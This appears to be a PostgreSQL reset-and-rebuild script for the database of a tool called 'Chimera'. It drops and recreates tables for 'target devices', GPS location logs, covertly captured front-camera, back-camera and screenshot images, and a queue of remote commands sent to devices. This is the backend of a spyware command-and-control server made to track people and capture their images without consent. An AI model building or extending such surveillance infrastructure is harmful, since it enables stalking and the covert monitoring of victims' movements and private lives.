-- Unconditional State Reset Protocol.
-- This script purges the entire Chimera schema and its dependencies.
-- The CASCADE directive severs all integrity constraints, ensuring execution.

DROP TABLE IF EXISTS commands CASCADE;
DROP TABLE IF EXISTS media_captures CASCADE;
DROP TABLE IF EXISTS geo_logs CASCADE;
DROP TABLE IF EXISTS devices CASCADE;

-- Schema Reconstruction from clean state.

-- Table for target devices
CREATE TABLE devices (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id TEXT UNIQUE NOT NULL,
    device_model TEXT,
    os_version TEXT,
    status TEXT DEFAULT 'active',
    last_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    ip_address TEXT
);

-- Table for geolocation data
CREATE TABLE geo_logs (
    id BIGSERIAL PRIMARY KEY,
    device_uuid UUID REFERENCES devices(id) ON DELETE CASCADE,
    latitude DOUBLE PRECISION NOT NULL,
    longitude DOUBLE PRECISION NOT NULL,
    altitude DOUBLE PRECISION,
    speed REAL,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Table for captured media (base64 encoded)
CREATE TABLE media_captures (
    id BIGSERIAL PRIMARY KEY,
    device_uuid UUID REFERENCES devices(id) ON DELETE CASCADE,
    capture_type TEXT NOT NULL, -- 'front_cam', 'back_cam', 'screenshot'
    data TEXT NOT NULL, -- Base64 encoded data
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Table for command tasking
CREATE TABLE commands (
    id BIGSERIAL PRIMARY KEY,
    device_uuid UUID REFERENCES devices(id) ON DELETE CASCADE,
    command_type TEXT NOT NULL,
    status TEXT DEFAULT 'pending', -- pending, delivered, executed, failed
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    executed_at TIMESTAMP WITH TIME ZONE
);